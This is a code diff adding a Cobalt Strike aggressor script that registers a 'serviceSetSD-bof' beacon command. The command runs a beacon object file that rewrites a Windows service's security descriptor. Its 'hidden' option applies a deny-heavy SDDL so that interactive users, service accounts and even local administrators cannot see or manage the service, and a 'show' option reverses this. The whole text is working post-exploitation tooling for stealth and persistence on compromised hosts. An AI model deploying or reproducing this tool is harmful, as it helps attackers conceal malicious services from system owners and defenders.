@@ -1,0 +1,30 @@
+beacon_command_register("serviceSetSD-bof", "Set Service SDDL to Hiden Service",
+	"Synopsis: serviceSetSD-bof <service-name> [hidden or show]\n");
+
+alias serviceSetSD-bof {
+    local('$service $set $sddl $barch $handle $data $args');
+    $service = $2;
+	$set = $3;
+    if ($service eq "") {
+		berror($1, beacon_command_detail("serviceSetSD-bof"));
+		return;
+	}
+	
+    $barch  = barch($1);
+	$handle = openf(script_resource("ServiceSetSD. $+ $barch $+ .obj"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# Pack our arguments
+	if ($set eq "hidden") {
+		$sddl = "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+	}else if($set eq "show") {
+		$sddl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+	}else {
+		berror($1, beacon_command_detail("serviceSetSD-bof"));
+		return;
+	}
+	btask($1, "Service set sddl");
+	$args = bof_pack($1, "zz", $service, $sddl);
+	beacon_inline_execute($1, $data, "go", $args);
+}
